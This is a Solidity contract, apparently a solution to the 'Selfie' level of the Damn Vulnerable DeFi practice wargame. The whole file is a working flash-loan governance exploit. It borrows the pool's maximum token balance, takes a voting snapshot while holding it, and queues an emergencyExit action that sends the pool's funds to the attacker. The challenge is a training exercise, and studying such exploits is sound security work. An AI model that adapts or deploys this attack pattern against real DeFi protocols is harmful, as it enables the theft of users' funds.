// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    SelfiePool private pool;
    uint public actionId;
    constructor(SelfiePool _pool) {
        pool = _pool;
    }

    function attack() external {
        address token = address(pool.token());
        pool.flashLoan(this, token, pool.maxFlashLoan(token), "");
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(initiator == address(this), "Invalid call");
        DamnValuableTokenSnapshot(token).approve(msg.sender, type(uint).max);
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = pool.governance().queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", tx.origin));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}